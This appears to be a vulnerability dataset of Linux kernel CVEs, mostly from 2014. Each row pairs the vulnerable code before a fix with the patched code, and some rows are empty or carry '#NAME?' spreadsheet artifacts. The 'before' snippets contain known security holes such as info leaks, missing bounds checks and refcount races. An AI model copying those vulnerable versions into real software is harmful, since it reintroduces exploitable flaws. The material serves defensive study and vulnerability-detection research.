2014,#NAME?,CVE-2014-2568,,
2014,DoS Exec Code ,CVE-2014-2523," const char *msg;
 u_int8_t state;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);
 BUG_ON(dh == NULL);

	state = dccp_state_table[CT_DCCP_ROLE_CLIENT][dh->dccph_type][CT_DCCP_NONE];
 u_int8_t type, old_state, new_state;
 enum ct_dccp_roles role;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);
 BUG_ON(dh == NULL);
	type = dh->dccph_type;

 unsigned int cscov;
 const char *msg;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);
 if (dh == NULL) {
		msg = ""nf_ct_dccp: short packet "";
 goto out_invalid;
"," const char *msg;
 u_int8_t state;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &_dh);
 BUG_ON(dh == NULL);

	state = dccp_state_table[CT_DCCP_ROLE_CLIENT][dh->dccph_type][CT_DCCP_NONE];
 u_int8_t type, old_state, new_state;
 enum ct_dccp_roles role;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &_dh);
 BUG_ON(dh == NULL);
	type = dh->dccph_type;

 unsigned int cscov;
 const char *msg;

	dh = skb_header_pointer(skb, dataoff, sizeof(_dh), &_dh);
 if (dh == NULL) {
		msg = ""nf_ct_dccp: short packet "";
 goto out_invalid;
"
2014,DoS Overflow ,CVE-2014-2309,,
2014,DoS ,CVE-2014-2039," .quad 0 # cr12: tracing off
 .quad 0 # cr13: home space segment table
 .quad 0xc0000000 # cr14: machine check handling off
 .quad 0  # cr15: linkage stack operations
.Lpcmsk:.quad 0x0000000180000000
.L4malign:.quad 0xffffffffffc00000
.Lscan2g:.quad 0x80000000 + 0x20000 - 8 # 2GB + 128K - 8
.Lnop: .long 0x07000700
.Lparmaddr:
 .quad	PARMAREA
 .align 64
.Lduct: .long 0,0,0,0,.Lduald,0,0,0
 .long 0,0,0,0,0,0,0,0

 .align 128
.Lduald:.rept 8
 .long 0x80000000,0,0,0 # invalid access-list entries
 .endr



ENTRY(_ehead)

"," .quad 0 # cr12: tracing off
 .quad 0 # cr13: home space segment table
 .quad 0xc0000000 # cr14: machine check handling off
 .quad .Llinkage_stack # cr15: linkage stack operations
.Lpcmsk:.quad 0x0000000180000000
.L4malign:.quad 0xffffffffffc00000
.Lscan2g:.quad 0x80000000 + 0x20000 - 8 # 2GB + 128K - 8
.Lnop: .long 0x07000700
.Lparmaddr:
 .quad	PARMAREA
 .align 64
.Lduct: .long 0,.Laste,.Laste,0,.Lduald,0,0,0
 .long 0,0,0,0,0,0,0,0
.Laste: .quad 0,0xffffffffffffffff,0,0,0,0,0,0
 .align 128
.Lduald:.rept 8
 .long 0x80000000,0,0,0 # invalid access-list entries
 .endr
.Llinkage_stack:
 .long 0,0,0x89000000,0,0,0,0x8a000000,0

ENTRY(_ehead)

"
2014,#NAME?,CVE-2014-2038," * extend the write to cover the entire page in order to avoid fragmentation
 * inefficiencies.
 *
 * If the file is opened for synchronous writes or if we have a write delegation
 * from the server then we can just skip the rest of the checks.
 */
static int nfs_can_extend_write(struct file *file, struct page *page, struct inode *inode)
{
 if (file->f_flags & O_DSYNC)
 return 0;


 if (NFS_PROTO(inode)->have_delegation(inode, FMODE_WRITE))
 return 1;
 if (nfs_write_pageuptodate(page, inode) && (inode->i_flock == NULL ||
			(inode->i_flock->fl_start == 0 &&
			inode->i_flock->fl_end == OFFSET_MAX &&
			inode->i_flock->fl_type != F_RDLCK)))
 return 1;
 return 0;
}
"," * extend the write to cover the entire page in order to avoid fragmentation
 * inefficiencies.
 *
 * If the file is opened for synchronous writes then we can just skip the rest
 * of the checks.
 */
static int nfs_can_extend_write(struct file *file, struct page *page, struct inode *inode)
{
 if (file->f_flags & O_DSYNC)
 return 0;
 if (!nfs_write_pageuptodate(page, inode))
 return 0;
 if (NFS_PROTO(inode)->have_delegation(inode, FMODE_WRITE))
 return 1;
 if (inode->i_flock == NULL || (inode->i_flock->fl_start == 0 &&

			inode->i_flock->fl_end == OFFSET_MAX &&
			inode->i_flock->fl_type != F_RDLCK))
 return 1;
 return 0;
}
"
2014,DoS ,CVE-2014-1874," struct context context;
 int rc = 0;





 if (!ss_initialized) {
 int i;

"," struct context context;
 int rc = 0;

 /* An empty security context is never valid. */
 if (!scontext_len)
 return -EINVAL;

 if (!ss_initialized) {
 int i;

"
2014,#NAME?,CVE-2014-1739," struct media_entity *ent;
 struct media_entity_desc u_ent;


 if (copy_from_user(&u_ent.id, &uent->id, sizeof(u_ent.id)))
 return -EFAULT;

"," struct media_entity *ent;
 struct media_entity_desc u_ent;

 memset(&u_ent, 0, sizeof(u_ent));
 if (copy_from_user(&u_ent.id, &uent->id, sizeof(u_ent.id)))
 return -EFAULT;

"
2014,#NAME?,CVE-2014-1738," int ret;

 while (ptr) {
		ret = copy_to_user(param, ptr, sizeof(*ptr));



 if (ret)
 return -EFAULT;
		param += sizeof(struct floppy_raw_cmd);
"," int ret;

 while (ptr) {
 struct floppy_raw_cmd cmd = *ptr;
		cmd.next = NULL;
		cmd.kernel_data = NULL;
		ret = copy_to_user(param, &cmd, sizeof(cmd));
 if (ret)
 return -EFAULT;
		param += sizeof(struct floppy_raw_cmd);
"
2014,#NAME?,CVE-2014-1737," return -ENOMEM;
	*rcmd = ptr;
	ret = copy_from_user(ptr, param, sizeof(*ptr));
 if (ret)
 return -EFAULT;
	ptr->next = NULL;
	ptr->buffer_length = 0;



	param += sizeof(struct floppy_raw_cmd);
 if (ptr->cmd_count > 33)
 /* the command may now also take up the space
 for (i = 0; i < 16; i++)
		ptr->reply[i] = 0;
	ptr->resultcode = 0;
	ptr->kernel_data = NULL;

 if (ptr->flags & (FD_RAW_READ | FD_RAW_WRITE)) {
 if (ptr->length <= 0)
"," return -ENOMEM;
	*rcmd = ptr;
	ret = copy_from_user(ptr, param, sizeof(*ptr));


	ptr->next = NULL;
	ptr->buffer_length = 0;
	ptr->kernel_data = NULL;
 if (ret)
 return -EFAULT;
	param += sizeof(struct floppy_raw_cmd);
 if (ptr->cmd_count > 33)
 /* the command may now also take up the space
 for (i = 0; i < 16; i++)
		ptr->reply[i] = 0;
	ptr->resultcode = 0;


 if (ptr->flags & (FD_RAW_READ | FD_RAW_WRITE)) {
 if (ptr->length <= 0)
"
2014,#NAME?,CVE-2014-1690," struct nf_conntrack_expect *exp)
{
 char buffer[sizeof(""4294967296 65635"")];


 u_int16_t port;
 unsigned int ret;

 /* Reply comes from server. */


 exp->saved_proto.tcp.port = exp->tuple.dst.u.tcp.port;
 exp->dir = IP_CT_DIR_REPLY;
 exp->expectfn = nf_nat_follow_master;
	}

 if (port == 0) {
 nf_ct_helper_log(skb, exp->master, ""all ports in use"");
 return NF_DROP;
	}

	ret = nf_nat_mangle_tcp_packet(skb, exp->master, ctinfo,
				       protoff, matchoff, matchlen, buffer,
 strlen(buffer));

















 if (ret != NF_ACCEPT) {
 nf_ct_helper_log(skb, exp->master, ""cannot mangle packet"");
 nf_ct_unexpect_related(exp);
	}

 return ret;
}

"," struct nf_conntrack_expect *exp)
{
 char buffer[sizeof(""4294967296 65635"")];
 struct nf_conn *ct = exp->master;
 union nf_inet_addr newaddr;
 u_int16_t port;
 unsigned int ret;

 /* Reply comes from server. */
	newaddr = ct->tuplehash[IP_CT_DIR_REPLY].tuple.dst.u3;

 exp->saved_proto.tcp.port = exp->tuple.dst.u.tcp.port;
 exp->dir = IP_CT_DIR_REPLY;
 exp->expectfn = nf_nat_follow_master;
	}

 if (port == 0) {
 nf_ct_helper_log(skb, ct, ""all ports in use"");
 return NF_DROP;
	}

 /* strlen(""\1DCC CHAT chat AAAAAAAA P\1\n"")=27
	 * strlen(""\1DCC SCHAT chat AAAAAAAA P\1\n"")=28
	 * strlen(""\1DCC SEND F AAAAAAAA P S\1\n"")=26
	 * strlen(""\1DCC MOVE F AAAAAAAA P S\1\n"")=26
	 * strlen(""\1DCC TSEND F AAAAAAAA P S\1\n"")=27
	 *
	 * AAAAAAAAA: bound addr (1.0.0.0==16777216, min 8 digits,
	 *                        255.255.255.255==4294967296, 10 digits)
	 * P:         bound port (min 1 d, max 5d (65635))
	 * F:         filename   (min 1 d )
	 * S:         size       (min 1 d )
	 * 0x01, \n:  terminators
 */
 /* AAA = ""us"", ie. where server normally talks to. */
 snprintf(buffer, sizeof(buffer), ""%u %u"", ntohl(newaddr.ip), port);
 pr_debug(""nf_nat_irc: inserting '%s' == %pI4, port %u\n"",
		 buffer, &newaddr.ip, port);

	ret = nf_nat_mangle_tcp_packet(skb, ct, ctinfo, protoff, matchoff,
				       matchlen, buffer, strlen(buffer));
 if (ret != NF_ACCEPT) {
 nf_ct_helper_log(skb, ct, ""cannot mangle packet"");
 nf_ct_unexpect_related(exp);
	}

 return ret;
}

"
2014,#NAME?,CVE-2014-1446," break;

 case SIOCYAMGCFG:

		yi.cfg.mask = 0xffffffff;
		yi.cfg.iobase = yp->iobase;
		yi.cfg.irq = yp->irq;
"," break;

 case SIOCYAMGCFG:
 memset(&yi, 0, sizeof(yi));
		yi.cfg.mask = 0xffffffff;
		yi.cfg.iobase = yp->iobase;
		yi.cfg.irq = yp->irq;
"
2014,#NAME?,CVE-2014-1445,"			ifr->ifr_settings.size = size; /* data size wanted */
 return -ENOBUFS;
		}

		line.clock_type = get_status(port)->clocking;
		line.clock_rate = 0;
		line.loopback = 0;
","			ifr->ifr_settings.size = size; /* data size wanted */
 return -ENOBUFS;
		}
 memset(&line, 0, sizeof(line));
		line.clock_type = get_status(port)->clocking;
		line.clock_rate = 0;
		line.loopback = 0;
"
2014,#NAME?,CVE-2014-1444,"	}

	i = port->index;

 sync.clock_rate = FST_RDL(card, portConfig[i].lineSpeed);
 /* Lucky card and linux use same encoding here */
 sync.clock_type = FST_RDB(card, portConfig[i].internalClock) ==
","	}

	i = port->index;
 memset(&sync, 0, sizeof(sync));
 sync.clock_rate = FST_RDL(card, portConfig[i].lineSpeed);
 /* Lucky card and linux use same encoding here */
 sync.clock_type = FST_RDB(card, portConfig[i].internalClock) ==
"
2014,DoS +Priv ,CVE-2014-1438," /* AMD K7/K8 CPUs don't save/restore FDP/FIP/FOP unless an exception
	   is pending.  Clear the x87 state here by setting it to fixed
	   values. ""m"" is a random variable that should be in L1 */
 alternative_input(
		ASM_NOP8 ASM_NOP2,
 ""emms\n\t"" /* clear stack tags */
 ""fildl %P[addr]"",	/* set F?P to defined value */
		X86_FEATURE_FXSAVE_LEAK,
		[addr] ""m"" (tsk->thread.fpu.has_fpu));


 return fpu_restore_checking(&tsk->thread.fpu);
}
"," /* AMD K7/K8 CPUs don't save/restore FDP/FIP/FOP unless an exception
	   is pending.  Clear the x87 state here by setting it to fixed
	   values. ""m"" is a random variable that should be in L1 */
 if (unlikely(static_cpu_has(X86_FEATURE_FXSAVE_LEAK))) {
 asm volatile(
 ""fnclex\n\t""
 ""emms\n\t""
 ""fildl %P[addr]"" /* set F?P to defined value */
			: : [addr] ""m"" (tsk->thread.fpu.has_fpu));
	}

 return fpu_restore_checking(&tsk->thread.fpu);
}
"
2014,#NAME?,CVE-2014-0206," if (head == tail)
 goto out;




 while (ret < nr) {
 long avail;
 struct io_event *ev;
"," if (head == tail)
 goto out;

	head %= ctx->nr_events;
	tail %= ctx->nr_events;

 while (ret < nr) {
 long avail;
 struct io_event *ev;
"
2014,DoS Overflow +Priv ,CVE-2014-0205,"{
 struct futex_hash_bucket *hb;

 get_futex_key_refs(&q->key);
	hb = hash_futex(&q->key);
	q->lock_ptr = &hb->lock;

queue_unlock(struct futex_q *q, struct futex_hash_bucket *hb)
{
 spin_unlock(&hb->lock);
 drop_futex_key_refs(&q->key);
}

/**
	q->pi_state = NULL;

 spin_unlock(q->lock_ptr);

 drop_futex_key_refs(&q->key);
}

/*
	}

retry:
 /* Prepare to wait on uaddr. */



	ret = futex_wait_setup(uaddr, val, fshared, &q, &hb);
 if (ret)
 goto out;

 /* If we were woken (and unqueued), we succeeded, whatever. */
	ret = 0;

 if (!unqueue_me(&q))
 goto out_put_key;
	ret = -ETIMEDOUT;
 if (to && !to->task)
 goto out_put_key;

 /*
	 * We expect signal_pending(current), but we might be the
	 * victim of a spurious wakeup as well.
 */
 if (!signal_pending(current)) {
 put_futex_key(fshared, &q.key);
 goto retry;
	}

	ret = -ERESTARTSYS;
 if (!abs_time)
 goto out_put_key;

	restart = &current_thread_info()->restart_block;
	restart->fn = futex_wait_restart;

	ret = -ERESTART_RESTARTBLOCK;

out_put_key:
 put_futex_key(fshared, &q.key);
out:
 if (to) {
 hrtimer_cancel(&to->timer);
	q.rt_waiter = &rt_waiter;
	q.requeue_pi_key = &key2;

 /* Prepare to wait on uaddr. */



	ret = futex_wait_setup(uaddr, val, fshared, &q, &hb);
 if (ret)
 goto out_key2;
	 * In order for us to be here, we know our q.key == key2, and since
	 * we took the hb->lock above, we also know that futex_requeue() has
	 * completed and we no longer have to concern ourselves with a wakeup
	 * race with the atomic proxy lock acquition by the requeue code.


 */

 /* Check if the requeue code acquired the second futex for us. */
","{
 struct futex_hash_bucket *hb;


	hb = hash_futex(&q->key);
	q->lock_ptr = &hb->lock;

queue_unlock(struct futex_q *q, struct futex_hash_bucket *hb)
{
 spin_unlock(&hb->lock);

}

/**
	q->pi_state = NULL;

 spin_unlock(q->lock_ptr);


}

/*
	}

retry:
 /*
	 * Prepare to wait on uaddr. On success, holds hb lock and increments
	 * q.key refs.
 */
	ret = futex_wait_setup(uaddr, val, fshared, &q, &hb);
 if (ret)
 goto out;

 /* If we were woken (and unqueued), we succeeded, whatever. */
	ret = 0;
 /* unqueue_me() drops q.key ref */
 if (!unqueue_me(&q))
 goto out;
	ret = -ETIMEDOUT;
 if (to && !to->task)
 goto out;

 /*
	 * We expect signal_pending(current), but we might be the
	 * victim of a spurious wakeup as well.
 */
 if (!signal_pending(current))

 goto retry;


	ret = -ERESTARTSYS;
 if (!abs_time)
 goto out;

	restart = &current_thread_info()->restart_block;
	restart->fn = futex_wait_restart;

	ret = -ERESTART_RESTARTBLOCK;



out:
 if (to) {
 hrtimer_cancel(&to->timer);
	q.rt_waiter = &rt_waiter;
	q.requeue_pi_key = &key2;

 /*
	 * Prepare to wait on uaddr. On success, increments q.key (key1) ref
	 * count.
 */
	ret = futex_wait_setup(uaddr, val, fshared, &q, &hb);
 if (ret)
 goto out_key2;
	 * In order for us to be here, we know our q.key == key2, and since
	 * we took the hb->lock above, we also know that futex_requeue() has
	 * completed and we no longer have to concern ourselves with a wakeup
	 * race with the atomic proxy lock acquisition by the requeue code. The
	 * futex_requeue dropped our key1 reference and incremented our key2
	 * reference count.
 */

 /* Check if the requeue code acquired the second futex for us. */
"
2014,DoS ,CVE-2014-0203," dget(dentry);
	}
 mntget(path->mnt);

	cookie = dentry->d_inode->i_op->follow_link(dentry, nd);
	error = PTR_ERR(cookie);
 if (!IS_ERR(cookie)) {
 goto out;

	error = PROC_I(inode)->op.proc_get_link(inode, &nd->path);
	nd->last_type = LAST_BIND;
out:
 return ERR_PTR(error);
}
"," dget(dentry);
	}
 mntget(path->mnt);
	nd->last_type = LAST_BIND;
	cookie = dentry->d_inode->i_op->follow_link(dentry, nd);
	error = PTR_ERR(cookie);
 if (!IS_ERR(cookie)) {
 goto out;

	error = PROC_I(inode)->op.proc_get_link(inode, &nd->path);

out:
 return ERR_PTR(error);
}
"
2014,DoS +Priv Mem. Corr. ,CVE-2014-0196," if (tty->ops->flush_chars)
				tty->ops->flush_chars(tty);
		} else {


 while (nr > 0) {

				c = tty->ops->write(tty, b, nr);

 if (c < 0) {
					retval = c;
 goto break_out;
"," if (tty->ops->flush_chars)
				tty->ops->flush_chars(tty);
		} else {
 struct n_tty_data *ldata = tty->disc_data;

 while (nr > 0) {
 mutex_lock(&ldata->output_lock);
				c = tty->ops->write(tty, b, nr);
 mutex_unlock(&ldata->output_lock);
 if (c < 0) {
					retval = c;
 goto break_out;
"
2014,Bypass ,CVE-2014-0181,,
2014,DoS ,CVE-2014-0155,,
2014,#NAME?,CVE-2014-0131," skb_frag_t *frag = skb_shinfo(head_skb)->frags;
 unsigned int mss = skb_shinfo(head_skb)->gso_size;
 unsigned int doffset = head_skb->data - skb_mac_header(head_skb);

 unsigned int offset = doffset;
 unsigned int tnl_hlen = skb_tnl_header_len(head_skb);
 unsigned int headroom;
			i = 0;
			nfrags = skb_shinfo(list_skb)->nr_frags;
			frag = skb_shinfo(list_skb)->frags;

			pos += skb_headlen(list_skb);

 while (pos < offset + len) {
				i = 0;
				nfrags = skb_shinfo(list_skb)->nr_frags;
				frag = skb_shinfo(list_skb)->frags;


 BUG_ON(!nfrags);

 goto err;
			}




			*nskb_frag = *frag;
 __skb_frag_ref(nskb_frag);
			size = skb_frag_size(nskb_frag);
"," skb_frag_t *frag = skb_shinfo(head_skb)->frags;
 unsigned int mss = skb_shinfo(head_skb)->gso_size;
 unsigned int doffset = head_skb->data - skb_mac_header(head_skb);
 struct sk_buff *frag_skb = head_skb;
 unsigned int offset = doffset;
 unsigned int tnl_hlen = skb_tnl_header_len(head_skb);
 unsigned int headroom;
			i = 0;
			nfrags = skb_shinfo(list_skb)->nr_frags;
			frag = skb_shinfo(list_skb)->frags;
			frag_skb = list_skb;
			pos += skb_headlen(list_skb);

 while (pos < offset + len) {
				i = 0;
				nfrags = skb_shinfo(list_skb)->nr_frags;
				frag = skb_shinfo(list_skb)->frags;
				frag_skb = list_skb;

 BUG_ON(!nfrags);

 goto err;
			}

 if (unlikely(skb_orphan_frags(frag_skb, GFP_ATOMIC)))
 goto err;

			*nskb_frag = *frag;
 __skb_frag_ref(nskb_frag);
			size = skb_frag_size(nskb_frag);
"
2014,DoS ,CVE-2014-0102,,
2014,DoS ,CVE-2014-0101," struct sctp_chunk auth;
 sctp_ierror_t ret;








 /* set-up our fake chunk so that we can process it */
		auth.skb = chunk->auth_chunk;
		auth.asoc = chunk->asoc;
"," struct sctp_chunk auth;
 sctp_ierror_t ret;

 /* Make sure that we and the peer are AUTH capable */
 if (!net->sctp.auth_enable || !new_asoc->peer.auth_capable) {
 kfree_skb(chunk->auth_chunk);
 sctp_association_free(new_asoc);
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);
		}

 /* set-up our fake chunk so that we can process it */
		auth.skb = chunk->auth_chunk;
		auth.asoc = chunk->asoc;
"
2014,DoS ,CVE-2014-0100,,
2014,DoS +Priv Mem. Corr. ,CVE-2014-0077,"	*iovcount = seg;
 if (unlikely(log))
		*log_num = nlogs;






 return headcount;
err:
 vhost_discard_vq_desc(vq, headcount);
 /* On error, stop handling until the next kick. */
 if (unlikely(headcount < 0))
 break;








 /* OK, now we need to know about added descriptors. */
 if (!headcount) {
 if (unlikely(vhost_enable_notify(&net->dev, vq))) {
","	*iovcount = seg;
 if (unlikely(log))
		*log_num = nlogs;

 /* Detect overrun */
 if (unlikely(datalen > 0)) {
		r = UIO_MAXIOV + 1;
 goto err;
	}
 return headcount;
err:
 vhost_discard_vq_desc(vq, headcount);
 /* On error, stop handling until the next kick. */
 if (unlikely(headcount < 0))
 break;
 /* On overrun, truncate and discard */
 if (unlikely(headcount > UIO_MAXIOV)) {
			msg.msg_iovlen = 1;
			err = sock->ops->recvmsg(NULL, sock, &msg,
 1, MSG_DONTWAIT | MSG_TRUNC);
 pr_debug(""Discarded rx packet: len %zd\n"", sock_len);
 continue;
		}
 /* OK, now we need to know about added descriptors. */
 if (!headcount) {
 if (unlikely(vhost_enable_notify(&net->dev, vq))) {
"
2014,DoS Overflow +Priv Mem. Corr. +Info ,CVE-2014-0069," unsigned long nr_segs, loff_t *poffset)
{
 unsigned long nr_pages, i;
 size_t copied, len, cur_len;
 ssize_t total_written = 0;
 loff_t offset;
 struct iov_iter it;

		save_len = cur_len;
 for (i = 0; i < nr_pages; i++) {
 copied = min_t(const size_t, cur_len, PAGE_SIZE);
			copied = iov_iter_copy_from_user(wdata->pages[i], &it,
 0, copied);
			cur_len -= copied;
 iov_iter_advance(&it, copied);









		}
		cur_len = save_len - cur_len;























		wdata->sync_mode = WB_SYNC_ALL;
		wdata->nr_pages = nr_pages;
		wdata->offset = (__u64)offset;
"," unsigned long nr_segs, loff_t *poffset)
{
 unsigned long nr_pages, i;
 size_t bytes, copied, len, cur_len;
 ssize_t total_written = 0;
 loff_t offset;
 struct iov_iter it;

		save_len = cur_len;
 for (i = 0; i < nr_pages; i++) {
 bytes = min_t(const size_t, cur_len, PAGE_SIZE);
			copied = iov_iter_copy_from_user(wdata->pages[i], &it,
 0, bytes);
			cur_len -= copied;
 iov_iter_advance(&it, copied);
 /*
			 * If we didn't copy as much as we expected, then that
			 * may mean we trod into an unmapped area. Stop copying
			 * at that point. On the next pass through the big
			 * loop, we'll likely end up getting a zero-length
			 * write and bailing out of it.
 */
 if (copied < bytes)
 break;
		}
		cur_len = save_len - cur_len;

 /*
		 * If we have no data to send, then that probably means that
		 * the copy above failed altogether. That's most likely because
		 * the address in the iovec was bogus. Set the rc to -EFAULT,
		 * free anything we allocated and bail out.
 */
 if (!cur_len) {
 for (i = 0; i < nr_pages; i++)
 put_page(wdata->pages[i]);
 kfree(wdata);
			rc = -EFAULT;
 break;
		}

 /*
		 * i + 1 now represents the number of pages we actually used in
		 * the copy phase above. Bring nr_pages down to that, and free
		 * any pages that we didn't use.
 */
 for ( ; nr_pages > i + 1; nr_pages--)
 put_page(wdata->pages[nr_pages - 1]);

		wdata->sync_mode = WB_SYNC_ALL;
		wdata->nr_pages = nr_pages;
		wdata->offset = (__u64)offset;
"
2014,Exec Code Overflow ,CVE-2014-0049,"		frag->len -= len;
	}

 if (vcpu->mmio_cur_fragment == vcpu->mmio_nr_fragments) {
		vcpu->mmio_needed = 0;

 /* FIXME: return into emulator if single-stepping.  */
","		frag->len -= len;
	}

 if (vcpu->mmio_cur_fragment >= vcpu->mmio_nr_fragments) {
		vcpu->mmio_needed = 0;

 /* FIXME: return into emulator if single-stepping.  */
"
2014,#NAME?,CVE-2014-0038," if (flags & MSG_CMSG_COMPAT)
 return -EINVAL;

 if (COMPAT_USE_64BIT_TIME)
 return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
				      flags | MSG_CMSG_COMPAT,
				      (struct timespec *) timeout);

 if (timeout == NULL)
 return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
				      flags | MSG_CMSG_COMPAT, NULL);

 if (get_compat_timespec(&ktspec, timeout))
 return -EFAULT;

	datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
				   flags | MSG_CMSG_COMPAT, &ktspec);
 if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
		datagrams = -EFAULT;

 return datagrams;
"," if (flags & MSG_CMSG_COMPAT)
 return -EINVAL;






 if (timeout == NULL)
 return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
				      flags | MSG_CMSG_COMPAT, NULL);

 if (compat_get_timespec(&ktspec, timeout))
 return -EFAULT;

	datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
				   flags | MSG_CMSG_COMPAT, &ktspec);
 if (datagrams > 0 && compat_put_timespec(&ktspec, timeout))
		datagrams = -EFAULT;

 return datagrams;
"
2019,DoS ,CVE-2013-7470," unsigned char err_offset = 0;
	u8 opt_len = opt[1];
	u8 opt_iter;


 if (opt_len < 8) {
		err_offset = 1;
	}

 for (opt_iter = 6; opt_iter < opt_len;) {
 if (opt[opt_iter + 1] > (opt_len - opt_iter)) {

			err_offset = opt_iter + 1;
 goto out;
		}
		opt_iter += opt[opt_iter + 1];
	}

out:
"," unsigned char err_offset = 0;
	u8 opt_len = opt[1];
	u8 opt_iter;
	u8 tag_len;

 if (opt_len < 8) {
		err_offset = 1;
	}

 for (opt_iter = 6; opt_iter < opt_len;) {
		tag_len = opt[opt_iter + 1];
 if ((tag_len == 0) || (opt[opt_iter + 1] > (opt_len - opt_iter))) {
			err_offset = opt_iter + 1;
 goto out;
		}
		opt_iter += tag_len;
	}

out:
"
2015,DoS Bypass ,CVE-2013-7446,"#define UNIX_GC_CANDIDATE 0
#define UNIX_GC_MAYBE_CYCLE 1
 struct socket_wq	peer_wq;

};

static inline struct unix_sock *unix_sk(const struct sock *sk)
 return s;
}

















































































































static int unix_writable(const struct sock *sk)
{
 return sk->sk_state != TCP_LISTEN &&
			skpair->sk_state_change(skpair);
 sk_wake_async(skpair, SOCK_WAKE_WAITD, POLL_HUP);
		}


 sock_put(skpair); /* It may now die */
 unix_peer(sk) = NULL;
	}
 INIT_LIST_HEAD(&u->link);
 mutex_init(&u->readlock); /* single task reading lock */
 init_waitqueue_head(&u->peer_wait);

 unix_insert_socket(unix_sockets_unbound(sk), sk);
out:
 if (sk == NULL)
 if (unix_peer(sk)) {
 struct sock *old_peer = unix_peer(sk);
 unix_peer(sk) = other;


 unix_state_double_unlock(sk, other);

 if (other != old_peer)
 struct scm_cookie scm;
 int max_level;
 int data_len = 0;


 wait_for_unix_gc();
	err = scm_send(sock, msg, &scm, false);
 goto out_free;
	}


 unix_state_lock(other);

	err = -EPERM;
 if (!unix_may_send(sk, other))
 goto out_unlock;

 if (sock_flag(other, SOCK_DEAD)) {
 /*
		 *	Check with 1003.1g - what should
		 *	datagram error
 */
 unix_state_unlock(other);
 sock_put(other);




		err = 0;
 unix_state_lock(sk);
 if (unix_peer(sk) == other) {
 unix_peer(sk) = NULL;


 unix_state_unlock(sk);

 unix_dgram_disconnected(sk, other);
 goto out_unlock;
	}

 if (unix_peer(other) != sk && unix_recvq_full(other)) {
 if (!timeo) {
			err = -EAGAIN;
 goto out_unlock;





		}

		timeo = unix_wait_for_peer(other, timeo);




		err = sock_intr_errno(timeo);
 if (signal_pending(current))
 goto out_free;




 goto restart;



	}




 if (sock_flag(other, SOCK_RCVTSTAMP))
 __net_timestamp(skb);
 maybe_add_creds(skb, sock, other);
 return len;

out_unlock:


 unix_state_unlock(other);
out_free:
 kfree_skb(skb);
 return mask;

	writable = unix_writable(sk);
	other = unix_peer_get(sk);
 if (other) {
 if (unix_peer(other) != sk) {
 sock_poll_wait(file, &unix_sk(other)->peer_wait, wait);
 if (unix_recvq_full(other))
				writable = 0;
		}
 sock_put(other);


	}

 if (writable)
","#define UNIX_GC_CANDIDATE 0
#define UNIX_GC_MAYBE_CYCLE 1
 struct socket_wq	peer_wq;
 wait_queue_t		peer_wake;
};

static inline struct unix_sock *unix_sk(const struct sock *sk)
 return s;
}

/* Support code for asymmetrically connected dgram sockets
 *
 * If a datagram socket is connected to a socket not itself connected
 * to the first socket (eg, /dev/log), clients may only enqueue more
 * messages if the present receive queue of the server socket is not
 * ""too large"". This means there's a second writeability condition
 * poll and sendmsg need to test. The dgram recv code will do a wake
 * up on the peer_wait wait queue of a socket upon reception of a
 * datagram which needs to be propagated to sleeping would-be writers
 * since these might not have sent anything so far. This can't be
 * accomplished via poll_wait because the lifetime of the server
 * socket might be less than that of its clients if these break their
 * association with it or if the server socket is closed while clients
 * are still connected to it and there's no way to inform ""a polling
 * implementation"" that it should let go of a certain wait queue
 *
 * In order to propagate a wake up, a wait_queue_t of the client
 * socket is enqueued on the peer_wait queue of the server socket
 * whose wake function does a wake_up on the ordinary client socket
 * wait queue. This connection is established whenever a write (or
 * poll for write) hit the flow control condition and broken when the
 * association to the server socket is dissolved or after a wake up
 * was relayed.
 */

static int unix_dgram_peer_wake_relay(wait_queue_t *q, unsigned mode, int flags,
 void *key)
{
 struct unix_sock *u;
 wait_queue_head_t *u_sleep;

	u = container_of(q, struct unix_sock, peer_wake);

 __remove_wait_queue(&unix_sk(u->peer_wake.private)->peer_wait,
			    q);
	u->peer_wake.private = NULL;

 /* relaying can only happen while the wq still exists */
	u_sleep = sk_sleep(&u->sk);
 if (u_sleep)
 wake_up_interruptible_poll(u_sleep, key);

 return 0;
}

static int unix_dgram_peer_wake_connect(struct sock *sk, struct sock *other)
{
 struct unix_sock *u, *u_other;
 int rc;

	u = unix_sk(sk);
	u_other = unix_sk(other);
	rc = 0;
 spin_lock(&u_other->peer_wait.lock);

 if (!u->peer_wake.private) {
		u->peer_wake.private = other;
 __add_wait_queue(&u_other->peer_wait, &u->peer_wake);

		rc = 1;
	}

 spin_unlock(&u_other->peer_wait.lock);
 return rc;
}

static void unix_dgram_peer_wake_disconnect(struct sock *sk,
 struct sock *other)
{
 struct unix_sock *u, *u_other;

	u = unix_sk(sk);
	u_other = unix_sk(other);
 spin_lock(&u_other->peer_wait.lock);

 if (u->peer_wake.private == other) {
 __remove_wait_queue(&u_other->peer_wait, &u->peer_wake);
		u->peer_wake.private = NULL;
	}

 spin_unlock(&u_other->peer_wait.lock);
}

static void unix_dgram_peer_wake_disconnect_wakeup(struct sock *sk,
 struct sock *other)
{
 unix_dgram_peer_wake_disconnect(sk, other);
 wake_up_interruptible_poll(sk_sleep(sk),
				   POLLOUT |
				   POLLWRNORM |
				   POLLWRBAND);
}

/* preconditions:
 *	- unix_peer(sk) == other
 *	- association is stable
 */
static int unix_dgram_peer_wake_me(struct sock *sk, struct sock *other)
{
 int connected;

	connected = unix_dgram_peer_wake_connect(sk, other);

 if (unix_recvq_full(other))
 return 1;

 if (connected)
 unix_dgram_peer_wake_disconnect(sk, other);

 return 0;
}

static int unix_writable(const struct sock *sk)
{
 return sk->sk_state != TCP_LISTEN &&
			skpair->sk_state_change(skpair);
 sk_wake_async(skpair, SOCK_WAKE_WAITD, POLL_HUP);
		}

 unix_dgram_peer_wake_disconnect(sk, skpair);
 sock_put(skpair); /* It may now die */
 unix_peer(sk) = NULL;
	}
 INIT_LIST_HEAD(&u->link);
 mutex_init(&u->readlock); /* single task reading lock */
 init_waitqueue_head(&u->peer_wait);
